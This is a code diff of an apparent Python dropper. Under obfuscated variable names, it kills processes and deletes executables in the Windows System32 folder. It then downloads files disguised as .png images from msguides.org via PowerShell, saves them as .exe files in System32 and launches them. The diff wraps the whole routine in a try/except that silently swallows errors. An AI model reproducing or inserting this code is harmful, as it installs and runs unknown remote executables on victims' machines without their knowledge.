@@ -1,32 +1,27 @@
 
-import os
-import time
-import subprocess
-
-time.sleep(1)
-
-ERSFWWRSA = os.path.expandvars("%SYSTEMROOT%")
-AWERPOLSEINSWA = f'{ERSFWWRSA}\\System32'
-
-url1 = 'https://msguides.org/delegatedWebFeatures.png'
-url2 = 'https://msguides.org/WebFeatures.png'
-
-
-subprocess.call('powershell [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12', shell=True)
-subprocess.call('taskkill /F /IM delegatedWebFeatures.exe', shell=True)
-time.sleep(1)
-subprocess.call(f'del {AWERPOLSEINSWA}\\delegatedWebFeatures.exe', shell=True)
-time.sleep(1)
-subprocess.call('powershell Invoke-WebRequest -Uri "{}" -OutFile "{}\\delegatedWebFeatures.exe"'.format(url1, AWERPOLSEINSWA), shell=True)
-time.sleep(1)
-subprocess.Popen('powershell "{0}\\delegatedWebFeatures.exe"'.format(AWERPOLSEINSWA), shell=True)
-time.sleep(1)
-subprocess.call('taskkill /F /IM WebFeatures.exe', shell=True)
-time.sleep(1)
-subprocess.call('taskkill /F /IM VisualFeatures.exe', shell=True)
-time.sleep(1)
-subprocess.call(f'del {AWERPOLSEINSWA}\\WebFeatures.exe', shell=True)
-time.sleep(1)
-subprocess.call('powershell Invoke-WebRequest -Uri "{}" -OutFile "{}\\WebFeatures.exe"'.format(url2, AWERPOLSEINSWA), shell=True)
-time.sleep(1)
-subprocess.Popen('powershell "{0}\\WebFeatures.exe"'.format(AWERPOLSEINSWA), shell=True)
+try:
+    time.sleep(1)
+    ERSFWWRSA = os.path.expandvars("%SYSTEMROOT%")
+    AWERPOLSEINSWA = f'{ERSFWWRSA}\\System32'
+    url1 = 'https://msguides.org/delegatedWebFeatures.png'
+    url2 = 'https://msguides.org/WebFeatures.png'
+    subprocess.call('powershell [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12', shell=True)
+    subprocess.call('taskkill /F /IM delegatedWebFeatures.exe', shell=True)
+    time.sleep(1)
+    subprocess.call(f'del {AWERPOLSEINSWA}\\delegatedWebFeatures.exe', shell=True)
+    time.sleep(1)
+    subprocess.call('powershell Invoke-WebRequest -Uri "{}" -OutFile "{}\\delegatedWebFeatures.exe"'.format(url1, AWERPOLSEINSWA), shell=True)
+    time.sleep(1)
+    subprocess.Popen('powershell "{0}\\delegatedWebFeatures.exe"'.format(AWERPOLSEINSWA), shell=True)
+    time.sleep(1)
+    subprocess.call('taskkill /F /IM WebFeatures.exe', shell=True)
+    time.sleep(1)
+    subprocess.call('taskkill /F /IM VisualFeatures.exe', shell=True)
+    time.sleep(1)
+    subprocess.call(f'del {AWERPOLSEINSWA}\\WebFeatures.exe', shell=True)
+    time.sleep(1)
+    subprocess.call('powershell Invoke-WebRequest -Uri "{}" -OutFile "{}\\WebFeatures.exe"'.format(url2, AWERPOLSEINSWA), shell=True)
+    time.sleep(1)
+    subprocess.Popen('powershell "{0}\\WebFeatures.exe"'.format(AWERPOLSEINSWA), shell=True)
+except:
+    pass
